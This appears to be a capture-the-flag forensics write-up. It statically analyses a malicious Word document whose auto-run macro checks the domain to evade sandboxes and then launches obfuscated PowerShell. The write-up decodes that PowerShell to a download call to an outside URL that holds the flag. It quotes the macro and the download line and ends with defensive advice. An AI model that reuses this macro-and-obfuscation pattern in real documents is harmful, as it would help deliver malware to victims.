## Overview

**Lure** is an Easy Forensics challenge built around a malicious Word document. Its auto-run
macro launches an obfuscated PowerShell command; peeling back two layers ‚Äî a UTF-16LE base64
`-EncodedCommand` and a `-f` (.NET `String.Format`) scramble ‚Äî reveals the URL the malware
would have contacted, and that URL path *is* the flag. The whole thing is solved **statically**,
without ever opening or running the document.

## The technique

**Step 1 ‚Äî extract the macro with `olevba` (never detonate a maldoc):**

```bash
olevba UrgentPayment.doc
```

It shows an auto-run macro with an anti-sandbox domain check:

```vba
Sub Document_Open()
    If Environ$("UserDomain") <> "MEGABANK.LOCAL" Then
        ' only fires on the intended target's domain
    Else
        Shell("pOweRshElL -ec cABPAHcARQByAHMA...", vbNormalFocus)
    End If
End Sub
```

**Step 2 ‚Äî decode the `-ec` blob.** PowerShell's `-EncodedCommand` is base64 of **UTF-16LE**
text:

```python
import base64
print(base64.b64decode("cABPAHcARQByAHMA...").decode('utf-16le'))
```

which yields a second layer:

```powershell
... iwr $(("{5}{25}{8}{7}...{4}" -f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:", ...))
```

**Step 3 ‚Äî resolve the `-f` String.Format scramble.** The `{5}{25}{8}‚Ä¶` placeholders pull the
argument list out of order to build a string. Reproduce that in Python and URL-decode:

```python
import urllib.parse
fmt  = "{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"
args = ["B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f",
        "1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U"]
print(urllib.parse.unquote(fmt.format(*args)))
# http://ow.ly/HTB{...}
```

URL-decoding (`%7B`‚Üí`{`, `%7D`‚Üí`}`) reveals the flag in the URL path.

## Solution

`solve.py` chains all three layers offline ‚Äî base64 ‚Üí UTF-16LE ‚Üí `String.Format` ordering ‚Üí
URL-decode ‚Äî and prints the flag:

```bash
python3 solve.py
# [+] FLAG: HTB{...}
```

## Why it worked

Malware stacks obfuscation (base64 ‚Üí UTF-16LE ‚Üí `-f` scramble) to slip past signatures, but
every layer is **reversible by design**: the victim's PowerShell must decode it to run it, so
an analyst can decode it just as easily ‚Äî statically, without executing anything.

## Fix / defense

- Block or disable Office macros and honor Mark-of-the-Web on internet-sourced documents.
- Alert on the `Document_Open` + `Shell` + `powershell -ec` combination.
- Decode `-EncodedCommand` (UTF-16LE base64) at the mail/proxy gateway and inspect the
  `iwr`/`iex` targets before delivery.
